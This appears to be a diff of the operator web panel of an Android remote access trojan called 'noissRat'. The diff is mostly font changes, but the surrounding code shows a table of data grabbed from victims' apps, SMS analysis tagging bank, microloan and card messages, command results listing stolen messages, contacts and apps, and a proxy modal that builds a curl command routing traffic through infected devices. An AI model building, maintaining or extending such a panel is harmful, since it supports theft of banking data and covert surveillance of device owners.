@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>noissRat Panel - Устройства</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <script src="https://unpkg.com/feather-icons"></script>
     <script src="/theme.js?v=2"></script>
     <style>
@@ -36,7 +36,7 @@
         }
 
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: 'Exo 2', sans-serif;
             background: var(--bg-dark);
             color: var(--text-white);
             min-height: 100vh;
@@ -94,7 +94,7 @@
             background: transparent;
             border: none;
             color: var(--text-white);
-            font-family: 'Inter', sans-serif;
+            font-family: 'Exo 2', sans-serif;
             font-size: 0.9rem;
             width: 200px;
             outline: none;
@@ -1930,7 +1930,7 @@
             font-size: 0.9rem;
             resize: vertical;
             min-height: 60px;
-            font-family: 'Inter', sans-serif;
+            font-family: inherit;
             transition: all 0.25s ease;
         }
         
@@ -2058,7 +2058,7 @@
             color: var(--text-gray);
             cursor: pointer;
             font-size: 0.7rem;
-            font-family: 'Inter', sans-serif;
+            font-family: inherit;
             transition: all 0.25s ease;
         }
 
@@ -2154,7 +2154,7 @@
             padding: 10px 12px;
             color: var(--text-white);
             font-size: 0.8rem;
-            font-family: 'Inter', sans-serif;
+            font-family: inherit;
             cursor: pointer;
             transition: all 0.25s ease;
         }
@@ -2188,7 +2188,7 @@
             padding: 10px 12px;
             color: var(--text-white);
             font-size: 0.8rem;
-            font-family: 'Inter', sans-serif;
+            font-family: inherit;
             transition: all 0.25s ease;
         }
 
@@ -2209,7 +2209,7 @@
             color: white;
             font-size: 0.8rem;
             font-weight: 600;
-            font-family: 'Inter', sans-serif;
+            font-family: inherit;
             cursor: pointer;
             transition: all 0.25s ease;
             box-shadow: 0 2px 10px rgba(220, 53, 69, 0.25);
@@ -6250,7 +6250,7 @@
             modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);backdrop-filter:blur(4px);z-index:10000;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity 0.2s;';
             
             var box = document.createElement('div');
-            box.style.cssText = 'background:rgba(15,15,18,0.97);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:28px;max-width:480px;width:90%;color:#e8e8e8;box-shadow:0 20px 60px rgba(0,0,0,0.5);transform:scale(0.95);transition:transform 0.2s cubic-bezier(0.4,0,0.2,1);font-family:Inter,sans-serif;';
+            box.style.cssText = 'background:rgba(15,15,18,0.97);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:28px;max-width:480px;width:90%;color:#e8e8e8;box-shadow:0 20px 60px rgba(0,0,0,0.5);transform:scale(0.95);transition:transform 0.2s cubic-bezier(0.4,0,0.2,1);font-family:Exo 2,sans-serif;';
             
             box.innerHTML = ''
                 + '<div style="display:flex;align-items:center;gap:10px;margin-bottom:20px;">'
@@ -6275,8 +6275,8 @@
                 + 'curl: <span style="font-family:JetBrains Mono,monospace;color:#4dabf7;font-size:11px;">curl -x socks5h://' + proxyLogin + ':' + proxyPass + '@' + proxyHost + ' https://ifconfig.me</span>'
                 + '</div></div>'
                 + '<div style="display:flex;gap:10px;">'
-                + '<button id="proxyCopyBtn" style="flex:1;padding:11px 16px;background:rgba(220,53,69,0.1);border:1px solid rgba(220,53,69,0.4);border-radius:10px;color:#dc3545;cursor:pointer;font-size:12px;font-weight:500;font-family:Inter,sans-serif;transition:all 0.2s;">Копировать</button>'
-                + '<button id="proxyCloseBtn" style="padding:11px 20px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:#707078;cursor:pointer;font-size:12px;font-family:Inter,sans-serif;transition:all 0.2s;">Закрыть</button>'
+                + '<button id="proxyCopyBtn" style="flex:1;padding:11px 16px;background:rgba(220,53,69,0.1);border:1px solid rgba(220,53,69,0.4);border-radius:10px;color:#dc3545;cursor:pointer;font-size:12px;font-weight:500;font-family:Exo 2,sans-serif;transition:all 0.2s;">Копировать</button>'
+                + '<button id="proxyCloseBtn" style="padding:11px 20px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:#707078;cursor:pointer;font-size:12px;font-family:Exo 2,sans-serif;transition:all 0.2s;">Закрыть</button>'
                 + '</div>';
             
             modal.appendChild(box);
@@ -7372,7 +7372,7 @@
                     result = { error: 'Parse error' };
                 }
                 
-                const count = result.count || (result.calls?.length) || (result.messages?.length) || (result.contacts?.length) || (result.apps?.length) || '';
+                const count = result.count || (result.messages?.length) || (result.contacts?.length) || (result.apps?.length) || '';
                 const countText = count ? `${count} ${L('cmd_records')}` : '';
                 const time = cmd.updated_at ? formatTimeAgo(cmd.updated_at) : formatTimeAgo(cmd.created_at);
                 
@@ -8550,7 +8550,7 @@
                 html += `<td style="padding:5px 6px;color:var(--text-dim);white-space:nowrap;">${time}</td>`;
                 html += `<td style="padding:5px 6px;color:var(--text-secondary);" title="${esc(g.app_package)}">${esc(g.app_name || g.app_package)}</td>`;
                 html += `<td style="padding:5px 6px;"><span style="background:${c}22;color:${c};padding:1px 6px;border-radius:3px;font-weight:600;font-size:10px;">${GRABS_CATEGORY_LABELS[g.category]||g.category}</span></td>`;
-                html += `<td style="padding:5px 6px;color:var(--text-primary);font-family:'JetBrains Mono',monospace;font-weight:600;cursor:pointer;" onclick="navigator.clipboard.writeText('${esc(g.text)}');showNotification(L('notify_copied'),'success')">${masked}</td>`;
+                html += `<td style="padding:5px 6px;color:var(--text-primary);font-family:monospace;font-weight:600;cursor:pointer;" onclick="navigator.clipboard.writeText('${esc(g.text)}');showNotification(L('notify_copied'),'success')">${masked}</td>`;
                 html += `<td style="padding:5px 6px;color:var(--text-dim);font-size:11px;">${esc(g.hint)}</td>`;
                 html += `</tr>`;
             }
@@ -8701,7 +8701,7 @@
         .sms-a-tag{display:inline-block;padding:2px 8px;margin:2px;border-radius:4px;font-size:11px;font-weight:600;}
         .sms-a-tag.bank{background:rgba(76,175,80,0.15);color:#4caf50;border:1px solid rgba(76,175,80,0.3);}
         .sms-a-tag.mfo{background:rgba(255,152,0,0.15);color:#ff9800;border:1px solid rgba(255,152,0,0.3);}
-        .sms-a-tag.card{background:rgba(33,150,243,0.15);color:#2196f3;border:1px solid rgba(33,150,243,0.3);font-family:'JetBrains Mono',monospace;}
+        .sms-a-tag.card{background:rgba(33,150,243,0.15);color:#2196f3;border:1px solid rgba(33,150,243,0.3);font-family:monospace;}
         .sms-a-tag.svc{background:rgba(156,39,176,0.15);color:#ce93d8;border:1px solid rgba(156,39,176,0.3);}
         .sms-a-row{display:flex;justify-content:space-between;padding:3px 0;font-size:12px;border-bottom:1px solid rgba(255,255,255,0.05);}
         .sms-a-row b{color:var(--text-main,#fff);}
